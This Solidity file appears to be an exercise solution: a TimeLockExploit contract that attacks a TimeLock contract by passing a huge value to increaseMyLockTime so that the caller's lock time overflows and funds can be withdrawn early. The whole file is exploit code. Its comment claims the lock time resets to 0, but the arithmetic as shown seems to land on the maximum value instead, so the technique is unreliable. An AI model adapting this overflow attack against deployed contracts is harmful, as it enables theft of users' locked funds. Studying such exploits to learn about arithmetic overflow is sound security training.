// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import { TimeLock } from "./TimeLock.sol";
import "hardhat/console.sol";

interface ITimeLock {
    function increaseMyLockTime(uint) external;
    function balancesByWallet(address) external returns(uint);
    function lockTimesByWallet(address) external returns(uint);
}

contract TimeLockExploit {
    uint256 MAX_INT = uint256(-1);
    ITimeLock immutable timeLockContract;

    constructor(address _timelockContractAddress) {
        timeLockContract = ITimeLock(_timelockContractAddress);
    }

    function attack() public {
        uint256 _currentTimeLock = timeLockContract.lockTimesByWallet(msg.sender);
        console.log("BEFORE:::", _currentTimeLock);
        
        // Reset uint to 0
        uint256 _differenceToResetUINT = MAX_INT - _currentTimeLock;
        timeLockContract.increaseMyLockTime(_differenceToResetUINT);
        console.log("AFTER:::", timeLockContract.lockTimesByWallet(msg.sender));
    }
}